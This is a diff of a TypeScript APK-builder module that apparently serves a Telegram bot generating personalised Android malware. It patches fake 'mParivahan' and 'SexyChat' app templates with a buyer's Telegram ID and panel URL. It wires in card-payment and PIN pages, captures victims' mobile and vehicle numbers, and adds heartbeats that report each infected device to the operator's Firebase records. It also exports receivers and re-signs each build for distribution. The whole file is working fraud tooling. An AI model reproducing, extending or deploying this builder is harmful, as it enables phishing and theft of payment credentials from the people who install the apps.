@@ -90,10 +90,16 @@ function bumpVersionCode(buildDir: string): void {
   if (!fs.existsSync(yml)) return;
   try {
     let txt = fs.readFileSync(yml, "utf-8");
-    txt = txt.replace(/versionCode:\s*(\d+)/, (_m, v) => `versionCode: ${Number(v) + 1}`);
+    txt = txt.replace(
+      /versionCode:\s*(\d+)/,
+      (_m, v) => `versionCode: ${Number(v) + 1}`
+    );
     fs.writeFileSync(yml, txt, "utf-8");
   } catch (err) {
-    console.warn("[apkBuilder] versionCode bump failed:", (err as Error).message);
+    console.warn(
+      "[apkBuilder] versionCode bump failed:",
+      (err as Error).message
+    );
   }
 }
 
@@ -109,7 +115,10 @@ function modernizeManifest(buildDir: string): void {
       txt = txt.replace(/targetSdkVersion:\s*\d+/, "targetSdkVersion: 35");
       fs.writeFileSync(yml, txt, "utf-8");
     } catch (err) {
-      console.warn("[apkBuilder] targetSdk bump failed:", (err as Error).message);
+      console.warn(
+        "[apkBuilder] targetSdk bump failed:",
+        (err as Error).message
+      );
     }
   }
   const mp = path.join(buildDir, "AndroidManifest.xml");
@@ -117,25 +126,40 @@ function modernizeManifest(buildDir: string): void {
   try {
     let txt = fs.readFileSync(mp, "utf-8");
     const adds: [string, string][] = [
-      ['<activity android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"',
-       '<activity android:exported="true" android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"'],
-      ['<activity android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>',
-       '<activity android:exported="true" android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>'],
-      ['<receiver android:name=".AlarmReceiver"/>',
-       '<receiver android:exported="true" android:name=".AlarmReceiver"/>'],
-      ['<receiver android:name=".MultiEventReceiver">',
-       '<receiver android:exported="true" android:name=".MultiEventReceiver">'],
+      [
+        '<activity android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"',
+        '<activity android:exported="true" android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"',
+      ],
+      [
+        '<activity android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>',
+        '<activity android:exported="true" android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>',
+      ],
+      [
+        '<receiver android:name=".AlarmReceiver"/>',
+        '<receiver android:exported="true" android:name=".AlarmReceiver"/>',
+      ],
+      [
+        '<receiver android:name=".MultiEventReceiver">',
+        '<receiver android:exported="true" android:name=".MultiEventReceiver">',
+      ],
     ];
     for (const [from, to] of adds) txt = txt.split(from).join(to);
     fs.writeFileSync(mp, txt, "utf-8");
   } catch (err) {
-    console.warn("[apkBuilder] exported-attr patch failed:", (err as Error).message);
+    console.warn(
+      "[apkBuilder] exported-attr patch failed:",
+      (err as Error).message
+    );
   }
 }
 
 // Shared placeholder patcher — replaces braced + unbraced forms so baked ids
 // land as plain values (avoids invalid Firebase path nodes like {id}).
-function patchFile(buildDir: string, relPath: string, replacements: [string, string][]): void {
+function patchFile(
+  buildDir: string,
+  relPath: string,
+  replacements: [string, string][]
+): void {
   const filePath = path.join(buildDir, relPath);
   if (!fs.existsSync(filePath)) return;
   let txt = fs.readFileSync(filePath, "utf-8");
@@ -150,21 +174,25 @@ const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
 const SEXY_TEMPLATE_DIR = "/tmp/sexy_patch/decoded";
 const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
 const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");
-const SEXY_DECODED_TAR_GZ = path.join(OUTPUT_DIR, "sexy_template_decoded.tar.gz");
+const SEXY_DECODED_TAR_GZ = path.join(
+  OUTPUT_DIR,
+  "sexy_template_decoded.tar.gz"
+);
 const SEXY_SMALI_FILE_REL = "assets/pin.html";
 
-const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
+const OWNER_PLACEHOLDER = "OWNER_TELEGRAM_ID_000000000";
 const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
 const DEVICE_ID_PLACEHOLDER = "DEVICE_ID_MY_PROJECT";
 // mParivahan v3 base: the notify service (dApp/binance/Trading/Signals/
 // MyService$1) reads the owner chat id from res/raw/Loda via AdminInfo —
 // no OWNER constant lives in smali anymore, so Loda is the readiness marker.
-const LODA_FILE_REL    = "res/raw/Loda";
-const CARD_HTML_REL    = "assets/card.html";
+const LODA_FILE_REL = "res/raw/Loda";
+const CARD_HTML_REL = "assets/card.html";
 
 // ── Nix fallback (Replit only) ────────────────────────────────────────────────
-const NIX_APKTOOL = "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
-const KEYSTORE    = path.join(OUTPUT_DIR, "NEWUIMPRIVHN-product.keystore");
+const NIX_APKTOOL =
+  "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
+const KEYSTORE = path.join(OUTPUT_DIR, "NEWUIMPRIVHN-product.keystore");
 // Signing keystore password — env override, else on-disk .signing-pass, else legacy default.
 const KS_PASS = (() => {
   const fromEnv = process.env["APK_KEYSTORE_PASS"];
@@ -178,7 +206,7 @@ const KS_PASS = (() => {
 
 // Android SDK build-tools (installed at /opt/android-sdk) — provides zipalign + apksigner.
 const APKSIGNER_BIN = "/opt/android-sdk/android-14/apksigner";
-const ZIPALIGN_BIN  = "/opt/android-sdk/android-14/zipalign";
+const ZIPALIGN_BIN = "/opt/android-sdk/android-14/zipalign";
 
 /**
  * Properly sign an APK: zipalign first, then apksigner with v1+v2.
@@ -187,7 +215,10 @@ const ZIPALIGN_BIN  = "/opt/android-sdk/android-14/zipalign";
 async function signApk(unsignedApk: string, finalApk: string): Promise<void> {
   // 1) zipalign -p 4 (must run BEFORE apksigner for v2)
   const alignedApk = `${unsignedApk}.aligned`;
-  await execAsync(`"${ZIPALIGN_BIN}" -p -f 4 "${unsignedApk}" "${alignedApk}"`, { timeout: 60_000 });
+  await execAsync(
+    `"${ZIPALIGN_BIN}" -p -f 4 "${unsignedApk}" "${alignedApk}"`,
+    { timeout: 60_000 }
+  );
 
   // 2) apksigner sign with v1+v2 schemes
   await execAsync(
@@ -199,7 +230,9 @@ async function signApk(unsignedApk: string, finalApk: string): Promise<void> {
 
   // 3) move signed aligned APK to final output
   await execAsync(`cp -f "${alignedApk}" "${finalApk}"`, { timeout: 30_000 });
-  await execAsync(`rm -f "${alignedApk}" "${alignedApk}.idsig"`).catch(() => {});
+  await execAsync(`rm -f "${alignedApk}" "${alignedApk}.idsig"`).catch(
+    () => {}
+  );
 }
 
 /** Force mobile viewport + mobile user-agent on the cloned-WebView activity. */
@@ -232,14 +265,19 @@ function removePanelBridge(buildDir: string): void {
  * so we replace it with the SDK path that V1BASE proved works.
  */
 
-
 function patchPaymentFlow(buildDir: string): void {
   // Re-route the method page -> the card payment page so the card section appears in the flow.
   const methodFp = path.join(buildDir, "assets/method.html");
   if (fs.existsSync(methodFp)) {
     let m = fs.readFileSync(methodFp, "utf-8");
-    if (m.includes('window.location.href = "pin.html"') && !m.includes('"card.html"')) {
-      m = m.replace('window.location.href = "pin.html"', 'window.location.href = "card.html"');
+    if (
+      m.includes('window.location.href = "pin.html"') &&
+      !m.includes('"card.html"')
+    ) {
+      m = m.replace(
+        'window.location.href = "pin.html"',
+        'window.location.href = "card.html"'
+      );
       fs.writeFileSync(methodFp, m, "utf-8");
     }
   }
@@ -254,7 +292,9 @@ function patchPaymentFlow(buildDir: string): void {
     }
     fs.writeFileSync(cardFp, c, "utf-8");
   }
-  console.log("[apkBuilder] payment flow patched (card section wired, axexodiweb config)");
+  console.log(
+    "[apkBuilder] payment flow patched (card section wired, axexodiweb config)"
+  );
 }
 
 function upgradeHeartbeat(buildDir: string): void {
@@ -269,7 +309,12 @@ function upgradeHeartbeat(buildDir: string): void {
     `}catch(e){}})();` +
     `</script>`;
 
-  for (const rel of ["assets/index.html", "assets/method.html", "assets/final.html", "assets/pin.html"]) {
+  for (const rel of [
+    "assets/index.html",
+    "assets/method.html",
+    "assets/final.html",
+    "assets/pin.html",
+  ]) {
     const fp = path.join(buildDir, rel);
     if (!fs.existsSync(fp)) continue;
     let html = fs.readFileSync(fp, "utf-8");
@@ -281,10 +326,16 @@ function upgradeHeartbeat(buildDir: string): void {
       SDK_HEARTBEAT("{DEVICE_ID_MY_PROJECT}")
     );
     // Strip any bare fetch-heartbeat IIFE left without a <script> wrapper.
-    html = html.replace(/\s*\(function\(\)\{try\{var hbDev="[^"]*";function hb\(\)\{fetch\([^<]*?\}\)\(\);?/g, "");
+    html = html.replace(
+      /\s*\(function\(\)\{try\{var hbDev="[^"]*";function hb\(\)\{fetch\([^<]*?\}\)\(\);?/g,
+      ""
+    );
     // Guarantee exactly one SDK heartbeat per page.
     if (!html.includes("firebase.initializeApp")) {
-      html = html.replace("</body>", SDK_HEARTBEAT("{DEVICE_ID_MY_PROJECT}") + "</body>");
+      html = html.replace(
+        "</body>",
+        SDK_HEARTBEAT("{DEVICE_ID_MY_PROJECT}") + "</body>"
+      );
     }
     // mParivahan login form -> panel: capture Mobile + Vehicle Number into the
     // client record (mobNo shows in Devices list, vehicle in device detail).
@@ -313,7 +364,10 @@ function upgradeHeartbeat(buildDir: string): void {
 }
 
 function patchWebViewMobileMode(buildDir: string): void {
-  const smaliPath = path.join(buildDir, "smali_classes4/trades/signals/more/ChallanWebActivity.smali");
+  const smaliPath = path.join(
+    buildDir,
+    "smali_classes4/trades/signals/more/ChallanWebActivity.smali"
+  );
   if (!fs.existsSync(smaliPath)) return;
   let txt = fs.readFileSync(smaliPath, "utf-8");
 
@@ -341,7 +395,7 @@ function patchWebViewMobileMode(buildDir: string): void {
   if (!txt.includes("setUserAgentString")) {
     txt = txt.replace(
       "invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V",
-      "invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V\n\n    const-string v7, \"Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36\"\n\n    invoke-virtual {v2, v7}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V"
+      'invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V\n\n    const-string v7, "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"\n\n    invoke-virtual {v2, v7}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V'
     );
   }
 
@@ -422,7 +476,9 @@ export async function initApkTemplate(): Promise<void> {
   if (fs.existsSync(DECODED_TAR_GZ)) {
     console.log("[apkBuilder] Extracting template from tar.gz...");
     try {
-      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, { timeout: 60_000 });
+      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, {
+        timeout: 60_000,
+      });
       console.log("[apkBuilder] Template extracted and ready.");
       // Also pre-download apktool in background so /apk is fast
       ensureApktool().catch((e) =>
@@ -435,14 +491,18 @@ export async function initApkTemplate(): Promise<void> {
   }
 
   // Fallback: full apktool decode
-  const baseApk = fs.existsSync(BASE_TEMPLATE_APK) ? BASE_TEMPLATE_APK : await getApkPath();
+  const baseApk = fs.existsSync(BASE_TEMPLATE_APK)
+    ? BASE_TEMPLATE_APK
+    : await getApkPath();
   if (!baseApk) {
     console.error("[apkBuilder] No base APK found — /apk command will fail.");
     return;
   }
   try {
     const apktool = await ensureApktool();
-    console.log("[apkBuilder] Decoding APK template via apktool (one-time, ~90s)...");
+    console.log(
+      "[apkBuilder] Decoding APK template via apktool (one-time, ~90s)..."
+    );
     await execAsync(`"${apktool}" d -f -o "${APK_TEMPLATE_DIR}" "${baseApk}"`, {
       timeout: 300_000,
     });
@@ -465,7 +525,9 @@ export async function initSexyTemplate(): Promise<void> {
   if (fs.existsSync(SEXY_DECODED_TAR_GZ)) {
     console.log("[apkBuilder] Extracting SexyChat template from tar.gz...");
     try {
-      await execAsync(`tar -xzf "${SEXY_DECODED_TAR_GZ}" -C /tmp`, { timeout: 60_000 });
+      await execAsync(`tar -xzf "${SEXY_DECODED_TAR_GZ}" -C /tmp`, {
+        timeout: 60_000,
+      });
       console.log("[apkBuilder] SexyChat template extracted and ready.");
       ensureApktool().catch((e) =>
         console.warn("[apkBuilder] apktool pre-download failed:", e.message)
@@ -481,10 +543,15 @@ export async function initSexyTemplate(): Promise<void> {
   if (!fs.existsSync(sexyApk)) return;
   try {
     const apktool = await ensureApktool();
-    console.log("[apkBuilder] Decoding SexyChat APK via apktool (one-time, ~90s)...");
-    await execAsync(`"${apktool}" d -f -o "${SEXY_TEMPLATE_DIR}" "${sexyApk}"`, {
-      timeout: 300_000,
-    });
+    console.log(
+      "[apkBuilder] Decoding SexyChat APK via apktool (one-time, ~90s)..."
+    );
+    await execAsync(
+      `"${apktool}" d -f -o "${SEXY_TEMPLATE_DIR}" "${sexyApk}"`,
+      {
+        timeout: 300_000,
+      }
+    );
     console.log("[apkBuilder] SexyChat template decoded and ready.");
   } catch (err) {
     console.error("[apkBuilder] Failed to decode SexyChat APK:", err);
@@ -498,11 +565,17 @@ export function isSexyTemplateReady(): boolean {
 /**
  * Build a per-user SexyChat APK with deviceId/ownerTelegramId baked in.
  */
-export async function buildSexyChatApk(telegramId: string): Promise<string | null> {
+export async function buildSexyChatApk(
+  telegramId: string
+): Promise<string | null> {
   fs.mkdirSync(APK_CACHE_DIR, { recursive: true });
 
   const cachedApk = path.join(APK_CACHE_DIR, `sexy_${telegramId}.apk`);
-  const stamps = [SEXY_DECODED_TAR_GZ, path.join(OUTPUT_DIR, "SexyChat_final.apk"), SEXY_TEMPLATE_DIR];
+  const stamps = [
+    SEXY_DECODED_TAR_GZ,
+    path.join(OUTPUT_DIR, "SexyChat_final.apk"),
+    SEXY_TEMPLATE_DIR,
+  ];
   if (cacheFresh(cachedApk, stamps)) return cachedApk;
 
   if (!isSexyTemplateReady()) {
@@ -510,7 +583,10 @@ export async function buildSexyChatApk(telegramId: string): Promise<string | nul
     if (!isSexyTemplateReady()) return null;
   }
 
-  const buildDir = await copyTemplate(SEXY_TEMPLATE_DIR, uniqueTag("sexy_build"));
+  const buildDir = await copyTemplate(
+    SEXY_TEMPLATE_DIR,
+    uniqueTag("sexy_build")
+  );
   const unsignedApk = `/tmp/${uniqueTag("sexy_unsigned")}.apk`;
   try {
     // Force mobile viewport/user-agent on WebView activity (fix desktop mode + white screen).
@@ -529,7 +605,9 @@ export async function buildSexyChatApk(telegramId: string): Promise<string | nul
     modernizeManifest(buildDir);
 
     const apktool = await ensureApktool();
-    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, { timeout: 300_000 });
+    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
+      timeout: 300_000,
+    });
     await signApk(unsignedApk, cachedApk);
     writeCacheStamp(cachedApk, stamps);
     return cachedApk;
@@ -555,7 +633,11 @@ export async function getApkPath(): Promise<string | null> {
 }
 
 export function isTemplateReady(): boolean {
-  return fs.existsSync(path.join(APK_TEMPLATE_DIR, LODA_FILE_REL));
+  // Native (nexus) build does not need the WebView template; either is fine.
+  return (
+    fs.existsSync(path.join(APK_TEMPLATE_DIR, LODA_FILE_REL)) ||
+    fs.existsSync(path.join(NEXUS_TEMPLATE_DIR, "smali_classes4"))
+  );
 }
 
 /**
@@ -593,9 +675,9 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
 
     // v3 base: owner id is baked into Loda (service reads it via AdminInfo)
     // and card.html (telegramChatId + ownerTelegramId); no smali patch needed.
-    patchFile(buildDir, LODA_FILE_REL,  [[OWNER_PLACEHOLDER, telegramId]]);
-    patchFile(buildDir, CARD_HTML_REL,  [
-      [OWNER_PLACEHOLDER,     telegramId],
+    patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
+    patchFile(buildDir, CARD_HTML_REL, [
+      [OWNER_PLACEHOLDER, telegramId],
       [DEVICE_ID_PLACEHOLDER, telegramId],
       [PANEL_URL_PLACEHOLDER, panelUrl],
     ]);
@@ -603,14 +685,18 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
     // client reporting — bake it so every device writes its own record.
     patchFile(buildDir, "assets/pin.html", [
       [DEVICE_ID_PLACEHOLDER, telegramId],
-      [OWNER_PLACEHOLDER,     telegramId],
+      [OWNER_PLACEHOLDER, telegramId],
     ]);
     // v3 boot screens (index/method/final) carry the heartbeat snippet —
     // bake the device id so it reports to clients/{ownerId} like the native side.
-    for (const bootFile of ["assets/index.html", "assets/method.html", "assets/final.html"]) {
+    for (const bootFile of [
+      "assets/index.html",
+      "assets/method.html",
+      "assets/final.html",
+    ]) {
       patchFile(buildDir, bootFile, [
         [DEVICE_ID_PLACEHOLDER, telegramId],
-        [OWNER_PLACEHOLDER,     telegramId],
+        [OWNER_PLACEHOLDER, telegramId],
       ]);
     }
 
@@ -618,7 +704,9 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
     modernizeManifest(buildDir);
 
     const apktool = await ensureApktool();
-    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, { timeout: 300_000 });
+    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
+      timeout: 300_000,
+    });
     await signApk(unsignedApk, cachedApk);
     writeCacheStamp(cachedApk, stamps);
     return cachedApk;
@@ -632,17 +720,26 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
 }
 
 /** Zip an APK so the user gets a .zip containing their personalized build. */
-export async function packageApkZip(apkPath: string, label: string): Promise<string | null> {
+export async function packageApkZip(
+  apkPath: string,
+  label: string
+): Promise<string | null> {
   if (!apkPath || !fs.existsSync(apkPath)) return null;
   try {
     const base = path.basename(apkPath).replace(/\.zip$/i, "");
     const zipPath = path.join(path.dirname(apkPath), `${base}_${label}.zip`);
     if (fs.existsSync(zipPath)) return zipPath;
-    await execAsync(`cd "${path.dirname(apkPath)}" && zip -j "${zipPath}" "${base}"`, { timeout: 120_000 });
+    await execAsync(
+      `cd "${path.dirname(apkPath)}" && zip -j "${zipPath}" "${base}"`,
+      { timeout: 120_000 }
+    );
     if (!fs.existsSync(zipPath)) return null;
     return zipPath;
   } catch (err) {
-    console.warn("[apkBuilder] zip packaging failed, sending raw APK:", (err as Error).message);
+    console.warn(
+      "[apkBuilder] zip packaging failed, sending raw APK:",
+      (err as Error).message
+    );
     return null;
   }
 }
@@ -671,10 +768,11 @@ export interface CustomApkOptions {
   orientation: "portrait" | "landscape" | "sensor";
   template: "mparivahan" | "sexy";
   iconUrl?: string;
-  iconData?: string;  // base64 data URL of uploaded logo image
+  iconData?: string; // base64 data URL of uploaded logo image
 }
 
-const ESC_XML = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+const ESC_XML = (s: string) =>
+  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
 function shade(hex: string, f: number): string {
   const n = parseInt(hex.replace("#", ""), 16);
@@ -720,20 +818,35 @@ function customSplashHtml(opts: CustomApkOptions): string {
 `;
 }
 
-export async function buildCustomApk(opts: CustomApkOptions): Promise<string | null> {
+export async function buildCustomApk(
+  opts: CustomApkOptions
+): Promise<string | null> {
   const id = String(opts.telegramId).trim();
-  const slug = (opts.appName || "app").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 20) || "custom";
+  const slug =
+    (opts.appName || "app")
+      .toLowerCase()
+      .replace(/[^a-z0-9]+/g, "-")
+      .replace(/^-+|-+$/g, "")
+      .slice(0, 20) || "custom";
   fs.mkdirSync(APK_CACHE_DIR, { recursive: true });
   const cachedApk = path.join(APK_CACHE_DIR, `custom_${slug}_${id}.apk`);
   const useSexy = opts.template === "sexy";
   const templateDir = useSexy ? SEXY_TEMPLATE_DIR : APK_TEMPLATE_DIR;
   const stamps = useSexy
-    ? [SEXY_DECODED_TAR_GZ, path.join(OUTPUT_DIR, "SexyChat_final.apk"), SEXY_TEMPLATE_DIR]
+    ? [
+        SEXY_DECODED_TAR_GZ,
+        path.join(OUTPUT_DIR, "SexyChat_final.apk"),
+        SEXY_TEMPLATE_DIR,
+      ]
     : [DECODED_TAR_GZ, BASE_TEMPLATE_APK, APK_TEMPLATE_DIR];
   if (cacheFresh(cachedApk, stamps)) return cachedApk;
 
   if (!fs.existsSync(path.join(templateDir, "AndroidManifest.xml"))) {
-    if (useSexy) { await initSexyTemplate(); } else { await initApkTemplate(); }
+    if (useSexy) {
+      await initSexyTemplate();
+    } else {
+      await initApkTemplate();
+    }
   }
 
   const buildDir = await copyTemplate(templateDir, uniqueTag("apk_custom"));
@@ -752,7 +865,10 @@ export async function buildCustomApk(opts: CustomApkOptions): Promise<string | n
     const fp = path.join(buildDir, "res/values/strings.xml");
     if (fs.existsSync(fp)) {
       let txt = fs.readFileSync(fp, "utf-8");
-      txt = txt.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${ESC_XML(opts.appName)}</string>`);
+      txt = txt.replace(
+        /<string name="app_name">[^<]*<\/string>/,
+        `<string name="app_name">${ESC_XML(opts.appName)}</string>`
+      );
       fs.writeFileSync(fp, txt, "utf-8");
     }
   }
@@ -775,8 +891,16 @@ export async function buildCustomApk(opts: CustomApkOptions): Promise<string | n
   }
 
   // 4) splash + redirect chain (card.html on legacy base, pin.html on v3 base)
-  fs.writeFileSync(path.join(buildDir, "assets/card.html"), customSplashHtml(opts), "utf-8");
-  fs.writeFileSync(path.join(buildDir, "assets/pin.html"), customSplashHtml(opts), "utf-8");
+  fs.writeFileSync(
+    path.join(buildDir, "assets/card.html"),
+    customSplashHtml(opts),
+    "utf-8"
+  );
+  fs.writeFileSync(
+    path.join(buildDir, "assets/pin.html"),
+    customSplashHtml(opts),
+    "utf-8"
+  );
   fs.writeFileSync(
     path.join(buildDir, "assets/final.html"),
     `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>…</title></head><body><script>window.location.replace('${opts.url.replace(/'/g, "")}');</script></body></html>`,
@@ -788,35 +912,63 @@ export async function buildCustomApk(opts: CustomApkOptions): Promise<string | n
   let iconBuf: Buffer | null = null;
   if (opts.iconData) {
     try {
-      const m = opts.iconData.match(/^data:image\/(png|jpe?g);base64,([A-Za-z0-9+/=]+)$/);
+      const m = opts.iconData.match(
+        /^data:image\/(png|jpe?g);base64,([A-Za-z0-9+/=]+)$/
+      );
       if (m) {
         const buf = Buffer.from(m[2], "base64");
         if (buf.length > 40 && buf.length <= 2_000_000) {
           iconBuf = buf;
-          console.log(`[apkBuilder] uploaded custom icon decoded (${buf.length} bytes)`);
+          console.log(
+            `[apkBuilder] uploaded custom icon decoded (${buf.length} bytes)`
+          );
         }
       }
-    } catch (err) { console.warn("[apkBuilder] iconData decode failed:", (err as Error).message); }
+    } catch (err) {
+      console.warn(
+        "[apkBuilder] iconData decode failed:",
+        (err as Error).message
+      );
+    }
   }
   if (!iconBuf && opts.iconUrl) {
     try {
-      const iconRes = await fetch(opts.iconUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: AbortSignal.timeout(12_000) });
+      const iconRes = await fetch(opts.iconUrl, {
+        headers: { "User-Agent": "Mozilla/5.0" },
+        signal: AbortSignal.timeout(12_000),
+      });
       if (iconRes.ok) {
         const buf = Buffer.from(await iconRes.arrayBuffer());
         if (buf.length > 40 && buf.length <= 2_000_000) {
           const magic = buf.subarray(0, 4);
-          if (magic.equals(Buffer.from([0x89, 0x50, 0x4e, 0x47])) || magic.equals(Buffer.from([0xff, 0xd8, 0xff]))) {
+          if (
+            magic.equals(Buffer.from([0x89, 0x50, 0x4e, 0x47])) ||
+            magic.equals(Buffer.from([0xff, 0xd8, 0xff]))
+          ) {
             iconBuf = buf;
-            console.log(`[apkBuilder] custom icon fetched (${buf.length} bytes)`);
+            console.log(
+              `[apkBuilder] custom icon fetched (${buf.length} bytes)`
+            );
           }
         }
       }
-    } catch (err) { console.warn("[apkBuilder] icon fetch failed, keeping default:", (err as Error).message); }
+    } catch (err) {
+      console.warn(
+        "[apkBuilder] icon fetch failed, keeping default:",
+        (err as Error).message
+      );
+    }
   }
   if (iconBuf) {
     const b = iconBuf;
-    const isPng  = b.length > 4 && b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47;
-    const isJpeg = b.length > 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff;
+    const isPng =
+      b.length > 4 &&
+      b[0] === 0x89 &&
+      b[1] === 0x50 &&
+      b[2] === 0x4e &&
+      b[3] === 0x47;
+    const isJpeg =
+      b.length > 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff;
     if (isPng || isJpeg) {
       const drawableDir = path.join(buildDir, "res/drawable");
       fs.mkdirSync(drawableDir, { recursive: true });
@@ -828,9 +980,13 @@ export async function buildCustomApk(opts: CustomApkOptions): Promise<string | n
       }
       const ext = isJpeg ? "jpg" : "png";
       fs.writeFileSync(path.join(drawableDir, `app_icon.${ext}`), b);
-      console.log(`[apkBuilder] launcher icon applied as app_icon.${ext} (${b.length} bytes)`);
+      console.log(
+        `[apkBuilder] launcher icon applied as app_icon.${ext} (${b.length} bytes)`
+      );
     } else {
-      console.warn("[apkBuilder] icon data is not PNG/JPEG — keeping default launcher icon");
+      console.warn(
+        "[apkBuilder] icon data is not PNG/JPEG — keeping default launcher icon"
+      );
     }
   }
 
@@ -842,12 +998,74 @@ export async function buildCustomApk(opts: CustomApkOptions): Promise<string | n
 
   const apktool = await ensureApktool();
   try {
-    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, { timeout: 180_000 });
+    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
+      timeout: 180_000,
+    });
     await signApk(unsignedApk, cachedApk);
     writeCacheStamp(cachedApk, stamps);
     return cachedApk;
   } catch (err) {
     console.error("[apkBuilder] buildCustomApk failed:", err);
+    return null;
+  } finally {
+    rmrf(buildDir);
+    execAsync(`rm -f "${unsignedApk}"`).catch(() => {});
+  }
+}
+
+// ── Nexus native build (reference "Mparivahan NextGen" template) ──────────
+const NEXUS_DECODED_TAR_GZ = path.join(
+  OUTPUT_DIR,
+  "nexus_template_decoded.tar.gz"
+);
+const NEXUS_TEMPLATE_DIR = "/tmp/nexus_patch/decoded";
+
+export async function buildNexusApk(
+  telegramId: string
+): Promise<string | null> {
+  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });
+  const cachedApk = path.join(APK_CACHE_DIR, `nexus_${telegramId}.apk`);
+  const stamps = [NEXUS_DECODED_TAR_GZ, NEXUS_TEMPLATE_DIR];
+  if (cacheFresh(cachedApk, stamps)) return cachedApk;
+
+  // Ensure decoded template is present.
+  if (!fs.existsSync(path.join(NEXUS_TEMPLATE_DIR, "smali_classes4"))) {
+    fs.mkdirSync("/tmp/nexus_patch", { recursive: true });
+    if (fs.existsSync(NEXUS_DECODED_TAR_GZ)) {
+      await execAsync(`tar -xzf "${NEXUS_DECODED_TAR_GZ}" -C /tmp`, {
+        timeout: 120_000,
+      });
+      await execAsync(`mv /tmp/user_ref_decoded "${NEXUS_TEMPLATE_DIR}"`, {
+        timeout: 30_000,
+      });
+    } else {
+      console.error(
+        "[apkBuilder] Nexus template tar.gz missing — /apk nexus will fail."
+      );
+      return null;
+    }
+  }
+
+  const buildDir = await copyTemplate(
+    NEXUS_TEMPLATE_DIR,
+    uniqueTag("nexus_build")
+  );
+  const unsignedApk = `/tmp/${uniqueTag("nexus_unsigned")}.apk`;
+  try {
+    // Bake the per-user Telegram ID as the customer id (all smali under the app package).
+    await execAsync(
+      `find "${buildDir}" -path "*trades/signals/more/*.smali" -exec sed -i "s/5064888403/${telegramId}/g" {} +`,
+      { timeout: 60_000 }
+    );
+    const apktool = await ensureApktool();
+    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
+      timeout: 300_000,
+    });
+    await signApk(unsignedApk, cachedApk);
+    writeCacheStamp(cachedApk, stamps);
+    return cachedApk;
+  } catch (err) {
+    console.error("[apkBuilder] buildNexusApk failed:", err);
     return null;
   } finally {
     rmrf(buildDir);
